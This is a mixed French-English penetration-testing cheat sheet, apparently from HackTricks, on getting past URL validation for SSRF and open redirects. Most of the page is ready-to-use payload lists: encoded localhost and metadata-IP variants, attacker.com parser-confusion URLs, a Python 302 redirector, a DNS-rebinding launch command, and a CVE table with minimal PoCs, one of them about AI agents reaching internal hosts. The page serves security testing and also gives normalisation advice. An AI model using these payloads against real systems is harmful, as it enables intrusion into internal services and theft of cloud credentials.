# URL Format Bypass

{{#include ../../banners/hacktricks-training.md}}

### Localhost

<details>
<summary>Localhost payloads</summary>
```bash
# Localhost
0 # Yes, just 0 is localhost in Linux
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CIDR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Mixed encodings bypass
169.254.43518 -> Partial Decimal (Class B) format combines the third and fourth parts of the IP address into a decimal number
0xA9.254.0251.0376 -> hexadecimal, decimal and octal

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
</details>

![](<../../images/image (776).png>)

L'**Burp extension** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) implémente des contournements du formatage IP.

### Parseur de domaine

<details>
<summary>Contournements du parseur de domaine</summary>
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
# double encoded fragment to bypass split("#"): attacker.com%2523@victim
```
</details>
```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```
### Domain Confusion

<details>
<summary>Domain confusion payloads</summary>
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com
# colon + backslash confusion (CVE-2025-0454 in autogpt)
http://localhost:\@google.com/../

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

# Parameter pollution
next={domain}&next=attacker.com
```
</details>

### Contournement des chemins et des extensions

Si l'URL doit se terminer par un chemin ou une extension, ou doit contenir un chemin, vous pouvez essayer l'un des contournements suivants :
```
https://metadata/vulnerable/path#/expected/path
https://metadata/vulnerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

L'outil [**recollapse**](https://github.com/0xacb/recollapse) peut générer des variations à partir d'une entrée donnée pour tenter de contourner le regex utilisé. Consultez aussi [**this post**](https://0xacb.com/2022/11/21/recollapse/) pour plus d'informations.

### Automatic Custom Wordlists

Consultez la webapp [**URL validation bypass cheat sheet** webapp](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) de portswigger où vous pouvez indiquer l'hôte autorisé et celui de l'attaquant, et elle générera une liste d'URLs à essayer pour vous. Elle prend également en compte si vous pouvez utiliser l'URL dans un paramètre, dans un Host header ou dans un CORS header.


{{#ref}}
https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
{{#endref}}

### Bypass via redirect

Il se peut que le serveur **filtre la requête originale** d'une SSRF **mais pas** une éventuelle réponse de **redirect** à cette requête.\
Par exemple, un serveur vulnérable à SSRF via: `url=https://www.google.com/` peut **filtrer le paramètre url**. Mais si vous utilisez un [python server to respond with a 302](https://pastebin.com/raw/ywAUhFrv) vers l'endroit où vous voulez rediriger, vous pourriez être capable d'**accéder aux adresses IP filtrées** comme 127.0.0.1 ou même des **protocoles** filtrés comme gopher.\
[Check out this report.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)

<details>
<summary>Redirecteur simple pour tester SSRF</summary>
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
</details>

### DNS rebinding bypass (2025+)

Même lorsqu'un filtre SSRF effectue une **seule résolution DNS avant d'envoyer la requête HTTP**, vous pouvez toujours atteindre des hôtes internes en rebinding le domaine entre la lookup et la connexion :

1. Pointer `victim.example.com` vers une IP publique afin qu'elle passe la vérification allow‑list / CIDR.
2. Servir un TTL très faible (ou utiliser un serveur autoritatif que vous contrôlez) et rebind le domaine vers `127.0.0.1` ou `169.254.169.254` juste avant que la requête réelle ne soit effectuée.
3. Tools like **Singularity** (`nccgroup/singularity`) automatisent le serveur DNS autoritatif + HTTP et incluent des payloads prêts à l'emploi. Exemple de lancement : `python3 singularity.py --lhost <your_ip> --rhost 127.0.0.1 --domain rebinder.test --http-port 8080`.

Cette technique a été utilisée en 2025 pour bypasser le correctif "safe URL" de BentoML et des filtres SSRF à résolution unique similaires.

### Explained Tricks

#### Backslash-trick

Le _backslash-trick_ exploite une différence entre la [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) et [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B). Alors que RFC3986 est un cadre général pour les URI, WHATWG est spécifique aux web URLs et est adopté par les navigateurs modernes. La distinction clé réside dans la reconnaissance par la norme WHATWG du backslash (`\`) comme équivalent du slash (`/`), ce qui impacte la façon dont les URLs sont parsées, marquant spécifiquement la transition du nom d'hôte vers le chemin dans une URL.

![https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg)

#### Left square bracket

Le caractère « left square bracket » `[` dans le segment userinfo peut amener Spring’s UriComponentsBuilder à renvoyer une valeur de hostname différente de celle des navigateurs : [https://example.com\[@attacker.com](https://portswigger.net/url-cheat-sheet#id=1da2f627d702248b9e61cc23912d2c729e52f878)

#### Other Confusions

![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../images/image (600).png>)

image from [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

#### IPv6 Zone Identifier (%25) Trick

Les parseurs d'URL modernes qui supportent RFC 6874 autorisent les adresses IPv6 *link-local* à inclure un **identifiant de zone** après un signe pourcentage. Certains filtres de sécurité ne sont pas au courant de cette syntaxe et ne supprimeront que les littéraux IPv6 entre crochets, laissant ainsi le payload suivant atteindre une interface interne :
```text
http://[fe80::1%25eth0]/          # %25 = encoded '%', interpreted as fe80::1%eth0
http://[fe80::a9ff:fe00:1%25en0]/ # Another example (macOS style)
```
Si l'application cible vérifie que l'hôte n'est *pas* `fe80::1` mais s'arrête de parser au niveau du `%`, elle peut traiter la requête à tort comme externe. Toujours normaliser l'adresse **avant** toute décision de sécurité ou supprimer entièrement l'identifiant de zone optionnel.

### CVE récentes de parsing des bibliothèques (2022–2026)

Un certain nombre de frameworks mainstream ont souffert de problèmes de mismatch de hostname exploitables pour SSRF une fois la validation d'URL contournée avec les astuces listées ci‑dessus :

| Année | CVE | Composant | Synopsis du bug | PoC minimal |
|------|-----|-----------|-----------------|-------------|
| 2025 | CVE-2025-0454 | Python `requests` + `urllib.parse` (autogpt) | Mismatch de parsing sur `http://localhost:\\@google.com/../` fait que les allow‑lists pensent que l'hôte est `google.com` alors que la requête atteint `localhost`. | `requests.get("http://localhost:\\@google.com/../")` |
| 2025 | CVE-2025-2691 | Node package `nossrf` | La librairie censée bloquer SSRF vérifie seulement le nom d'hôte original, pas l'**IP résolue**, permettant des noms d'hôte qui résolvent vers des plages privées. | `curl "http://trusted.example" --resolve trusted.example:80:127.0.0.1` |
| 2024 | CVE-2024-29415 | Node `ip` package | `isPublic()` a mal classifié le dotted‑octal / la forme courte de localhost (par ex., `0127.0.0.1`, `127.1`) comme publique, laissant les filtres accepter des cibles internes. | `ip.isPublic('0127.0.0.1')` returns true on vulnerable versions |
| 2024 | CVE-2024-3095 | Langchain WebResearchRetriever | Pas de filtrage d'hôte ; des requêtes GET pouvaient atteindre IMDS/localhost depuis des agents AI. | URL contrôlée par l'utilisateur à l'intérieur de `WebResearchRetriever` |
| 2024 | CVE-2024-22243 / ‑22262 | Spring `UriComponentsBuilder` | `[` dans userinfo analysé différemment par Spring vs les navigateurs, permettant un contournement d'allow‑list. | `https://example.com\[@internal` |
| 2023 | CVE-2023-27592 | **urllib3** <1.26.15 | La confusion avec les backslashes permettait à `http://example.com\\@169.254.169.254/` de contourner des filtres d'hôte qui scindent sur `@`. | — |
| 2022 | CVE-2022-3602 | OpenSSL | La vérification du hostname était sautée lorsque le nom est suffixé par un `.` (confusion liée aux domaines se terminant par un point). | — |

### Helpers de génération de payloads (2024+)

Créer de grandes word‑lists personnalisées à la main est fastidieux. L'outil open‑source **SSRF-PayloadMaker** (Python 3) peut maintenant générer *80 k+* combinaisons de mangling d'hôtes automatiquement, incluant des encodages mixtes, forced-HTTP downgrade et des variantes avec backslash :
```bash
# Generate every known bypass that transforms the allowed host example.com to attacker.com
python3 ssrf_maker.py --allowed example.com --attacker attacker.com -A -o payloads.txt
```
La liste résultante peut être utilisée directement dans Burp Intruder ou `ffuf`.

## Références

- [https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25](https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
- [https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet](https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-22243](https://nvd.nist.gov/vuln/detail/CVE-2024-22243)
- [https://github.com/hsynuzm/SSRF-PayloadMaker](https://github.com/hsynuzm/SSRF-PayloadMaker)
- [https://medium.com/%40narendarlb123/1-cve-2025-0454-autogpt-ssrf-via-url-parsing-confusion-921d66fafcbe](https://medium.com/%40narendarlb123/1-cve-2025-0454-autogpt-ssrf-via-url-parsing-confusion-921d66fafcbe)
- [https://www.tenable.com/blog/how-tenable-bypassed-patch-for-bentoml-ssrf-vulnerability-CVE-2025-54381](https://www.tenable.com/blog/how-tenable-bypassed-patch-for-bentoml-ssrf-vulnerability-CVE-2025-54381)

{{#include ../../banners/hacktricks-training.md}}
